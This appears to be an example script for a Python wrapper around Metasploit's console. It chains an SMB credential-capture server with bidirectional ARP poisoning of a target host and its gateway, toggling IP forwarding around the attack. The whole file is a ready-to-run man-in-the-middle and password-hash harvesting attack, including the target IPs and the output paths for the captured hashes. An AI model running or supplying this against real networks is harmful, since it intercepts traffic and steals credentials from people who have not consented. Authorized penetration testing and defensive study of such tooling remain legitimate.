#!/usr/bin/env python
'''
Example usage of msfconsoleCommand class from msf.py
'''
import subprocess
import sys              #import pointing to parent folder for this example...
sys.path.append("..")   #add it to PYTHONPATH       

import msf      

#build initial command
myCommand = msf.msfconsoleCommand("use auxiliary/server/capture/smb",
                                           "set srvhost 192.168.1.100",     #Our IP
                                           "set cainpwfile /tmp/cain",
                                           "set johnpwfile /tmp/john",
                                           "run"
                                           )
#Wait - we want to add some more commands before executing
#Like maybe do some ARP spoofing?

#set up IP forwarding
subprocess.Popen("echo '1' > /proc/sys/net/ipv4/ip_forward", shell=True)


myCommand.add_msfconsole_args("use auxiliary/spoof/arp/arp_poisoning",
                                "set DHOSTS 192.168.1.101",     #Poison target
                                "set SHOSTS 192.168.1.1",       #Poison gateway
                                "set INTERFACE eth0",
                                "set BIDIRECTIONAL true",
                                "run")

#Fire it off - Make sure we exit Metasploit nicely using the exit command instead of
#ctrl-c so that the script continues processing and fixes our IP forward entry!!!
myCommand.execute()

#Command is done - clean up the IP forwarding
subprocess.Popen("echo '0' > /proc/sys/net/ipv4/ip_forward", shell=True)

